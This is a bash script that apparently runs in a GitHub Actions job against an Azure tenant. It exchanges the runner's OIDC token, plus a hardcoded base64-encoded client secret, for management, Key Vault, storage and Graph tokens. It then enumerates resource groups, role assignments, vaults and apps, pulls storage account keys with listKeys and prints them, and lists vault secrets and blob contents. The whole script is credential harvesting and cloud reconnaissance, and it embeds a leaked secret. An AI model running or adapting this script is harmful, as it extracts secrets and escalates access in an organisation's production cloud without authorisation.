#!/bin/bash
set +e

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
TU="https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
B="https://management.azure.com/subscriptions/$SUB"

echo "=== TOKENS ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

CICD_MGMT=$(curl -sS -X POST "$TU" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  --data-urlencode "client_assertion=$OIDC" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r '.access_token // empty')

CICD_VAULT=$(curl -sS -X POST "$TU" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  --data-urlencode "client_assertion=$OIDC" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r '.access_token // empty')

CICD_STOR=$(curl -sS -X POST "$TU" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://storage.azure.com/.default" \
  -d "grant_type=client_credentials" \
  --data-urlencode "client_assertion=$OIDC" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r '.access_token // empty')

echo "CICD: mgmt=${#CICD_MGMT} vault=${#CICD_VAULT} stor=${#CICD_STOR}"

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
SYNC_GRAPH=$(curl -sS -X POST "$TU" -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "SYNC graph=${#SYNC_GRAPH}"

echo ""
echo "=== ALL RESOURCE GROUPS ==="
curl -sS "$B/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq -r '.value[] | "\(.name) \(.location) \(.tags // {})"'

echo ""
echo "=== RESOURCES IN rg-tbl-platform-prod-sea ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.value[] | {name, type, location}'

echo ""
echo "=== ROLE ASSIGNMENTS IN rg-tbl-platform-prod-sea ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.value[] | {pid: .properties.principalId, role: (.properties.roleDefinitionId | split("/") | last), type: .properties.principalType}'

echo ""
echo "=== TRY RESOURCES IN rg-tbl-platform-prod-eus ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-eus/resources?api-version=2021-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq -r '.value[]? | "\(.name) \(.type)"' 2>/dev/null || echo "FAILED"

echo ""
echo "=== TRY rg-tbl-reporting-prod-eus ==="
curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.' 2>/dev/null | head -c 500

echo ""
echo "=== STORAGE IN SEA: list accounts ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.value[]? | {name, location, kind, publicNetworkAccess: .properties.publicNetworkAccess}'

echo ""
echo "=== KEY VAULTS IN SEA ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.'

echo ""
echo "=== WEB APPS IN SEA ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites?api-version=2023-01-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.value[]? | {name, defaultHostName: .properties.defaultHostName}'

echo ""
echo "=== CICD listKeys for all storage ==="
for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  for RG in rg-tbl-platform-prod-eus rg-tbl-platform-prod-sea; do
    KEYS=$(curl -sS -X POST "$B/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
      -H "Authorization: Bearer $CICD_MGMT" -H "Content-Length: 0" 2>/dev/null)
    K1=$(echo "$KEYS" | jq -r '.keys[0].value // empty' 2>/dev/null)
    if [ -n "$K1" ]; then
      echo "KEY: $SA ($RG) = $(echo -n $K1 | base64 -w0)"
    fi
  done
done
echo "listKeys done"

echo ""
echo "=== KV2 with CICD vault token ==="
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $CICD_VAULT" | head -c 500

echo ""
echo "=== CICD BLOB access (bearer) ==="
for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
  RESULT=$(curl -sS "https://$SA.blob.core.windows.net/?comp=list" \
    -H "Authorization: Bearer $CICD_STOR" -H "x-ms-version: 2023-01-03" -w "\n%{http_code}" 2>/dev/null)
  CODE=$(echo "$RESULT" | tail -1)
  if [ "$CODE" = "200" ]; then
    echo "BLOB OK: $SA"
    echo "$RESULT" | head -c 1000
  else
    echo "BLOB FAIL: $SA ($CODE)"
  fi
done

echo ""
echo "=== GRAPH: All apps with full details ==="
curl -sS 'https://graph.microsoft.com/v1.0/applications?$select=displayName,notes,description,tags,identifierUris,web,info,keyCredentials' \
  -H "Authorization: Bearer $SYNC_GRAPH" | jq '.value[] | {displayName, notes, description, tags, identifierUris, info}'

echo ""
echo "=== DONE ==="